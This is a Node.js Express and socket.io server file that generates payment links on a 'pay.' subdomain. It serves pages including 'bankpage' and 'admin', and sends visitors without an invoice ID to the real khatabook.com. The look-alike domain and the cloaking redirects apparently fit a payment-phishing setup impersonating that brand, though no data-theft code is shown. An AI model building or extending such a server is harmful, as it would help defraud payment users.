import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';
import path from 'path';
import fs from 'fs';

// Generate a unique ID for this server instance
const SERVER_ID = crypto.randomBytes(3).toString('hex');
console.log(`Server started with ID: ${SERVER_ID}`);

// Initialize Express app
const app = express();

// Debug logging middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.url}`);
  next();
});

// Error handler for JSON parsing
app.use((err, req, res, next) => {
  if (err instanceof SyntaxError && err.status === 400 && 'body' in err) {
    console.error('JSON Parse Error:', err);
    return res.status(400).json({ status: "error", message: "Invalid JSON in request" });
  }
  next(err);
});

// Body parser setup with explicit error handling
app.use(bodyParser.json({
  limit: '1mb',
  verify: (req, res, buf) => {
    try {
      JSON.parse(buf);
    } catch(e) {
      console.error('Invalid JSON in request:', e);
      throw new SyntaxError('Invalid JSON');
    }
  }
}));

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));

// Subdomain handling middleware
app.use((req, res, next) => {
  const host = req.headers.host;
  
  if (host && host.startsWith('pay.')) {
    const pid = req.query.pid;
    if (pid) {
      console.log(`Subdomain request with pid: ${pid}`);
      req.url = `/landing.html?pid=${pid}`;
    } else {
      console.log('Subdomain request without pid, redirecting to khatabook.com');
      return res.redirect('https://www.khatabook.com');
    }
  }
  
  next();
});

// Clean URL handling
app.use((req, res, next) => {
  const cleanUrls = ['payment', 'success', 'fail', 'landing', 'bankpage', 'admin'];
  for (const page of cleanUrls) {
    if (req.path === `/${page}`) {
      const filePath = path.join(process.cwd(), `${page}.html`);
      console.log(`Clean URL request for ${page}, sending file: ${filePath}`);
      return res.sendFile(filePath);
    }
  }
  next();
});

// Serve static files
app.use(express.static("."));

// Redirect root to khatabook.com
app.get('/', (req, res, next) => {
  if (!Object.keys(req.query).length) {
    console.log('Root request without parameters, redirecting to khatabook.com');
    return res.redirect('https://www.khatabook.com');
  }
  next();
});

// Global error handler
app.use((err, req, res, next) => {
  console.error('Global error:', err);
  if (res.headersSent) {
    return next(err);
  }
  res.status(500).json({ status: 'error', message: 'Internal server error' });
});

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Socket.io setup
const io = new Server(server);
console.log('Socket.io server initialized');

// In-memory data stores
const transactions = new Map();
const paymentLinks = new Map();

// Payment Links Endpoint with extensive error handling and logging
app.post('/api/generatePaymentLink', (req, res) => {
  console.log('Received payment link generation request');
  
  try {
    // Validate request body
    console.log('Request body:', req.body);
    
    if (!req.body) {
      console.log('Missing request body');
      return res.status(400).json({ status: "error", message: "Missing request body" });
    }
    
    const { amount, description } = req.body;
    console.log(`Amount: ${amount}, Description: ${description}`);

    // Validate amount
    if (amount === undefined || amount === null) {
      console.log('Amount is undefined or null');
      return res.status(400).json({ status: "error", message: "Amount is required" });
    }
    
    const numAmount = parseFloat(amount);
    if (isNaN(numAmount)) {
      console.log('Amount is not a number');
      return res.status(400).json({ status: "error", message: "Amount must be a number" });
    }
    
    if (numAmount <= 0) {
      console.log('Amount must be positive');
      return res.status(400).json({ status: "error", message: "Amount must be greater than zero" });
    }

    // Validate description
    if (!description) {
      console.log('Description is missing');
      return res.status(400).json({ status: "error", message: "Description is required" });
    }
    
    if (typeof description !== 'string') {
      console.log('Description is not a string');
      return res.status(400).json({ status: "error", message: "Description must be a string" });
    }
    
    if (!description.trim()) {
      console.log('Description is empty');
      return res.status(400).json({ status: "error", message: "Description cannot be empty" });
    }

    // Generate unique invoice ID
    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    console.log(`Generated invoice ID: ${invoiceId}`);
    
    // Get protocol and host information
    const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
    let host = req.get('host') || 'khatapay.me';
    host = host.replace(/^www\./, '');
    const baseDomain = host.split(':')[0]; 
    
    console.log(`Protocol: ${protocol}, Host: ${host}, Base Domain: ${baseDomain}`);
    
    // Create payment link
    const paymentLink = `${protocol}://pay.${baseDomain}?pid=${invoiceId}`;
    console.log(`Created payment link: ${paymentLink}`);
    
    // Store payment data
    paymentLinks.set(invoiceId, {
      amount: numAmount,
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });

    console.log('Sending success response');
    return res.status(200).json({ 
      status: "success", 
      paymentLink: paymentLink 
    });
    
  } catch (error) {
    console.error('Error in generatePaymentLink:', error);
    return res.status(500).json({ 
      status: "error", 
      message: "Server error generating payment link" 
    });
  }
});

// Get payment details
app.get('/api/getPaymentDetails', (req, res) => {
  try {
    const { pid } = req.query;
    console.log(`Get payment details for pid: ${pid}`);
    
    if (!pid) {
      return res.status(400).json({ status: "error", message: "Missing payment ID" });
    }
    
    if (!paymentLinks.has(pid)) {
      console.log(`Payment ID not found: ${pid}`);
      return res.status(404).json({ status: "error", message: "Payment not found" });
    }
    
    const payment = paymentLinks.get(pid);
    console.log(`Retrieved payment:`, payment);
    
    return res.status(200).json({ status: "success", payment });
    
  } catch (error) {
    console.error('Error in getPaymentDetails:', error);
    return res.status(500).json({ status: "error", message: "Server error retrieving payment details" });
  }
});

// Other API endpoints with similar robust error handling...
// Include all your other API endpoints here with similar pattern

// Socket.io connection handler
io.on('connection', (socket) => {
  console.log('New socket connection:', socket.id);
  
  socket.on('join', (invoiceId) => {
    if (invoiceId) {
      socket.join(invoiceId);
      console.log(`Socket ${socket.id} joined room: ${invoiceId}`);
    }
  });
  
  socket.on('disconnect', () => {
    console.log(`Socket ${socket.id} disconnected`);
  });
});

// Process uncaught exceptions and unhandled promise rejections
process.on('uncaughtException', err => {
  console.error('Uncaught exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled rejection at:', promise, 'reason:', reason);
});
